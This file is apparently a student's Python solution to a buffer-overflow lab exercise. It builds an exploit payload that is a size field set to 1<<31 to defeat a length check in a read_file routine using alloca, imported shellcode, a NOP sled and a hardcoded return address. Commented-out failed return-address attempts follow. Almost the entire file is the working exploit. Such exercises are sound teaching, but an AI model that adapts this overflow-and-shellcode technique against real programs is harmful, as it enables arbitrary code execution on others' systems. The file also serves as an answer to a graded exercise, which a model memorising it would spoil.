#!/usr/bin/env python3

import sys
from shellcode import shellcode
from struct import pack

# Your code here
#count = len(shellcode)
count = pack("<I", ((1<<31)))           # need to overflow size check in read_file... 
                                        # man (3) alloca for more details...
                                        
padding = (b'\x90')*21                  # nop sled
new_eip = pack("<I", 0xFFFE8E20)        # new_eip to return to...
payload = count + shellcode + padding + new_eip
sys.stdout.buffer.write(payload)


## failed attempts :'(
#new_eip = pack("<I", 0xFFFE8E50)
#new_eip = pack("<I", 0xFFFE8E34)
#new_eip = pack("<I", 0xFFFE8E30)
#fp = open("tmp", "wb+")
#fp = open("tmp", mode="w+", encoding="utf-8", newline='')
#fp.write(pack("<I", count))
#fp.write(str(pack("<I",(count))))
#fp.write(str(count))
#fp.write(str(pack("<I",0xfffe8dc0)))
#fp.write(str(pack("<I",0xfffe8dc0)))
#fp.write(str(pack("<I",0xfffe8dc0)))
#fp.write(str(pack("<I",0xfffe8dc0)))
#fp.write(str(pack("<I",0xfffe8dc0)))
#fp.write(str(pack("<I",0xfffe8dc0)))
#fp.write(str(pack("<I",0xfffe8dc0)))
#fp.write(str(pack("<I",0xfffe8dc0)))
#fp.write(str(pack("<I",0xfffe8dc0)))
#fp.write(str(pack("<I",0xfffe8dc0)))
#fp.write(str(pack("<I",0xfffe8dc0)))
#fp.write(pack("<I",0xfffe8dc0))
#fp.write(pack("<I",0xfffe8dc0))
#fp.write(pack("<I",0xfffe8dc0))
#fp.write(pack("<I",0xfffe8dc0))
#fp.write(pack("<I",0xfffe8dc0))

#fp.write(pack("<I",0xfffe8dc0))

#fp.write(pack("<I",0xfffe8dc0))
#fp.write(pack("<I",0xfffe8dc0))
#fp.write(pack("<I",0xfffe8dc0))
#fp.write(pack("<I",0xfffe8dc0))
#fp.write(pack("<I",0xfffe8dc0))
#fp.write(pack("<I",0xfffe8dc0))
#fp.write(pack("<I",0xfffe8e4c))
